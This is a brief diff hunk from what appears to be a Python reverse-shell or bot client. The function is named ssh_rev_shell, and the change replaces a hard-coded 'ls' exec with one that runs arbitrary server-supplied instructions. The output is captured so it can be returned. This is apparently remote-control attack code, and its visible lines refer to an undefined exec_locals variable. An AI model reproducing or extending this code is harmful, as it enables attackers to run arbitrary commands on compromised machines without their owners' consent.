@@ -174,7 +174,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                             sys.stdout = output  # Redirect stdout to capture print statements
                             
                             exec_globals = {}
-                            exec("response = exec_underlying_command(b'ls')", exec_globals)  # Execute within a dictionary
+                            exec(server_instructions, exec_globals, exec_locals)  # Execute within a dictionary
                             response = exec_globals.get("response", "")  # Retrieve the output manually
 
                             sys.stdout = sys.__stdout__  # Restore stdout
